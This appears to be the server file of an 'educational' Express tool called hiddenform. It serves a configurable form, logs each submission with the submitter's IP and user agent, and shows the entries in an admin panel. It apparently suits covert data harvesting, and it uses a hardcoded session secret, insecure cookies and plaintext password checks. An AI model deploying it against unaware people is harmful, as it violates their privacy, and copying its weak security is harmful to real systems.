const express = require('express');
const nunjucks = require('nunjucks');
const session = require('express-session');
const Database = require('better-sqlite3');
const fs = require('fs');

const app = express();
const db = new Database('database.db');

let config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use('/milligram', express.static('node_modules/milligram/dist'));
app.use('/sweetalert2', express.static('node_modules/sweetalert2/dist'));
app.use('/public', express.static('public'));
app.use(session({
    secret: 'hiddenformsecret', // In production, use a secure and unique secret.
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Set to true if using HTTPS.
}));

nunjucks.configure('views', {
    autoescape: true,
    express: app
});

app.get('/', (req, res) => {
    // Read the config file to get the fields and pass it to the template. Called every time the page is loaded to reflect any changes in the config file without restarting the server.
    let newConfig = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
    res.render('index.html', { fields: newConfig.fields});
});

app.post('/submit', (req, res) => {
    const data = req.body;
    db.prepare('INSERT INTO submissions (data, ip, user_agent) VALUES (?, ?, ?)').run(JSON.stringify(data), req.ip, req.headers['user-agent']);
    res.json({ success: true, message: 'Data received successfully!' });
});

app.get('/admin', (req, res) => {
    if (req.session && req.session.isAdmin) {
        const rows = db.prepare('SELECT * FROM submissions ORDER BY id DESC').all();
        const submissions = rows.map(row => ({
            id: row.id,
            data: JSON.parse(row.data),
            ip: row.ip,
            user_agent: row.user_agent,
            created_at: new Date(row.created_at).toLocaleString()
        }));
        res.render('admin_panel.html', { submissions });
    } else {
        res.render('admin_login.html');
    }
});

app.get('/admin/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/admin');
});

app.delete('/submissions/:id', (req, res) => {
    if (req.session && req.session.isAdmin) {
        const { id } = req.params;
        db.prepare('DELETE FROM submissions WHERE id = ?').run(id);
        res.json({ success: true, message: 'Submission deleted successfully.' });
    } else {
        res.json({ success: false, message: 'Submission deletion failed.' });
    }
});

app.post('/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === config.dashboard.username && password === config.dashboard.password) {
        req.session.isAdmin = true;
        res.json({ success: true, message: 'Access granted.' }); // Some haxxor message here. idk
    } else {
        res.json({ success: false, message: 'Access denied.' });
    }
});

app.listen(config.dashboard.port, config.dashboard.host, () => {
    console.log(`
██╗  ██╗██╗██████╗ ██████╗ ███████╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗
██║  ██║██║██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║
███████║██║██║  ██║██║  ██║█████╗  ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║
██╔══██║██║██║  ██║██║  ██║██╔══╝  ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║
██║  ██║██║██████╔╝██████╔╝███████╗██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
                                                                                 
Made with ❤️ by @R4shSec - https://github.com/R4shSec

🔗 https://github.com/R4shSec/hiddenform

⚠️ This is an educational tool and is intended for educational purposes only. Use it responsibly and ethically.

👉 Dashboard is running on port http://${config.dashboard.host}:${config.dashboard.port}
👉 Access admin panel on http://${config.dashboard.host}:${config.dashboard.port}/admin

`);
});